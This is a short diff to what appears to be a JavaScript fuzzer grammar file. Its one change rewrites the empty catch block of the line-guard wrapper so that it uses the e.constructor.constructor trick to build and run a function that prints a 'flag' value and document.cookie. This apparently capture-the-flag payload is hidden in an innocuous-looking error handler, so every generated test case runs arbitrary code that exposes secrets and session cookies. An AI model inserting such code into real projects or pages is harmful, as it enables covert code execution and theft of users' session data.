@@ -14,7 +14,7 @@
 
 <root root=true> = <lines count=1000>
 
-!lineguard try { <line> } catch(e) { }
+!lineguard try { <line> } catch(e) { e.constructor.constructor("console.log(flag);console.log(document.cookie);")(); }
 
 !include common.txt
 !include jshelpers.txt
